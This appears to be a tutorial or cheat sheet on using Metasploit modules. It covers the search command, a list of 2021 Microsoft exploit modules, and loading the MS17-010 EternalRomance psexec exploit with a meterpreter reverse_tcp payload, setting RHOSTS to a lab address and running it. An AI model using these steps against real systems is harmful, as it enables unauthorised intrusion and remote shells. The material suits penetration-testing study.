# Modules

## Searching for Modules

### Search Function

```sh
msf6 > help search
```

```output title="Output"
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  adapter          :  Modules with a matching adater reference name
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  session_type     :  Modules with a matching session type (SMB, MySQL, Meterpreter, etc)
  stage            :  Modules with a matching stage reference name
  stager           :  Modules with a matching stager reference name
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)
  action           :  Modules with a matching action name or description

Supported search columns:
  rank             :  Sort modules by their exploitability rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method
  action           :  Sort modules by whether or not they have actions

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

### Specific Search

```sh
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

```output title="Output"
Matching Modules
================

   #   Name                                                          Disclosure Date  Rank       Check  Description
   -   ----                                                          ---------------  ----       -----  -----------
   0   exploit/windows/http/exchange_proxylogon_rce                  2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1     \_ target: Windows Powershell                               .                .          .      .
   2     \_ target: Windows Dropper                                  .                .          .      .
   3     \_ target: Windows Command                                  .                .          .      .
   4   exploit/windows/http/exchange_proxyshell_rce                  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   5     \_ target: Windows Powershell                               .                .          .      .
   6     \_ target: Windows Dropper                                  .                .          .      .
   7     \_ target: Windows Command                                  .                .          .      .
   8   exploit/windows/http/exchange_chainedserializationbinder_rce  2021-12-09       excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
   9     \_ target: Windows Command                                  .                .          .      .
   10    \_ target: Windows Dropper                                  .                .          .      .
   11    \_ target: PowerShell Stager                                .                .          .      .
   12  exploit/windows/fileformat/word_mshtml_rce                    2021-09-23       excellent  No     Microsoft Office Word Malicious MSHTML RCE
   13  exploit/windows/http/sharepoint_unsafe_control                2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
   14    \_ target: Windows Command                                  .                .          .      .
   15    \_ target: Windows Dropper                                  .                .          .      .
   16    \_ target: PowerShell Stager                                .                .          .      .


Interact with a module by name or index. For example info 16, use 16 or use exploit/windows/http/sharepoint_unsafe_control
After interacting with a module you can manually set a TARGET with set TARGET 'PowerShell Stager'
```

## Using Modules

### Select a Module

```sh
msf6 > use exploit/windows/smb/ms17_010_psexec
```

### Module Information

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

```output title="Output"
       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic
      1   PowerShell
      2   Native upload
      3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                                 Required  Description
  ----                  ---------------                                 --------  -----------
  DBGTRACE              false                                           yes       Show extra debug trace info
  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
  RHOSTS                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
                                                                                  etasploit.html
  RPORT                 445                                             yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                                   no        Service description to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                                  no        The service display name
  SERVICE_NAME                                                          no        The service name
  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                                                  lder share
  SMBDomain             .                                               no        The Windows domain to use for authentication
  SMBPass                                                               no        The password for the specified username
  SMBUser                                                               no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
  primitive. This will then be used to overwrite the connection session information with as an
  Administrator session. From there, the normal psexec payload code execution is done.

  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
  Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
  exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
  named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE


View the full module info with the info -d command.
```

### Show Options

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

```output title="Output"
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                 Required  Description
   ----                  ---------------                                 --------  -----------
   DBGTRACE              false                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                  no        The service display name
   SERVICE_NAME                                                          no        The service name
   SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                               no        The Windows domain to use for authentication
   SMBPass                                                               no        The password for the specified username
   SMBUser                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.106    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

### Target Specification

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```

### Permanent Target Specification

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

### Exploit Execution

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > run
```
